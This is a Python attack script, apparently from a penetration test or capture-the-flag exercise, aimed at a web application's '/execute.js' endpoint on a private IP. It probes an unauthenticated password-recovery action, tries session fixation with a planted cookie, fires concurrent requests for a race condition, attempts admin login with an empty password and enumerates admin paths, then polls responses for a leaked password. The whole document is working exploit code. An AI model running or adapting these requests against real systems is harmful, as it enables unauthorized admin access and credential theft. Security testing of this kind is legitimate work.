import requests
import time

TARGET = 'http://10.0.0.1'
EXECUTE_URL = TARGET + '/execute.js'

# Test 1: Without any cookies (no session)
print("=== Test 1: No session ===")
resp = requests.post(EXECUTE_URL, params={"exec": "forgot"}, 
                    data={"license": "0", "sdcard": "1234567890"}, timeout=10)
print(f"  {len(resp.text)}b: {resp.text[:80]}")
print(f"  Set-Cookie: {resp.headers.get('Set-Cookie', 'none')[:60]}")

# Test 2: Send with our own PHPSESSID (session fixation)
print("\n=== Test 2: Session fixation ===")
s = requests.Session()
# Set a custom session ID
s.cookies.set("PHPSESSID", "hack1234567890abcdef")
resp = s.post(EXECUTE_URL, params={"exec": "forgot"}, 
             data={"license": "0", "sdcard": "1234567890"}, timeout=10)
print(f"  {len(resp.text)}b: {resp.text[:80]}")
print(f"  Cookie after: {dict(s.cookies)}")

# Test 3: Send concurrent requests
print("\n=== Test 3: Concurrent requests ===")
import threading
results = []

def send_forgot(idx):
    s = requests.Session()
    try:
        resp = s.post(EXECUTE_URL, params={"exec": "forgot"}, 
                     data={"license": "0", "sdcard": "1234567890"}, timeout=10)
        results.append((idx, len(resp.text), resp.text[:50]))
    except Exception as e:
        results.append((idx, -1, str(e)))

threads = []
for i in range(5):
    t = threading.Thread(target=send_forgot, args=(i,))
    threads.append(t)
    t.start()
    time.sleep(0.05)

for t in threads:
    t.join()

for idx, length, snippet in results:
    print(f"  Thread {idx}: {length}b: {snippet}")

# Test 4: Try sconvert then check if we can access admin
print("\n=== Test 4: sconvert + admin access ===")
s2 = requests.Session()
resp = s2.post(EXECUTE_URL, params={"exec": "sconvert"}, 
              data={"sconvert": "1", "username": "admin", "password": ""}, timeout=10)
print(f"sconvert: {len(resp.text)}b: {resp.text[:80]}")

# Now try accessing admin pages
for path in ["/admin/", "/admin/index.php", "/execute.js?exec=login",
             "/admin/index?action=execute.js", "/admin/index?action=dashboard"]:
    try:
        resp = s2.get(f"{TARGET}{path}", timeout=5)
        kw = "admin" if "admin" in resp.text.lower() else ""
        print(f"  {path}: [{len(resp.text)}b] {kw} {resp.text[:60]}")
    except Exception as e:
        print(f"  {path}: error {e}")

# Test 5: Try the forgot with GET instead of POST
print("\n=== Test 5: GET forgot ===")
s3 = requests.Session()
resp = s3.get(f"{EXECUTE_URL}?exec=forgot&license=0&sdcard=1234567890", timeout=10)
print(f"  {len(resp.text)}b: {resp.text[:80]}")

# Test 6: What if we send a request with longer timeout after the Please Wait?
print("\n=== Test 6: Long wait ===")
s4 = requests.Session()
resp = s4.post(EXECUTE_URL, params={"exec": "forgot"}, 
              data={"license": "0", "sdcard": "1234567890"}, timeout=10)
print(f"  Initial: {len(resp.text)}b")

# Wait for the check to complete
for i in range(10):
    time.sleep(1)
    resp = s4.post(EXECUTE_URL, params={"exec": "forgot"}, 
                  data={"license": "0", "sdcard": "1234567890"}, timeout=10)
    # Check if response changed from "Please Wait"
    if "wait" not in resp.text[:50].lower():
        print(f"  After {i+1}s: {len(resp.text)}b - {resp.text[:80]}")
        if "password" in resp.text.lower():
            print("  *** PASSWORD FOUND ***")
        break
    print(f"  After {i+1}s: still waiting... [{len(resp.text)}b]")
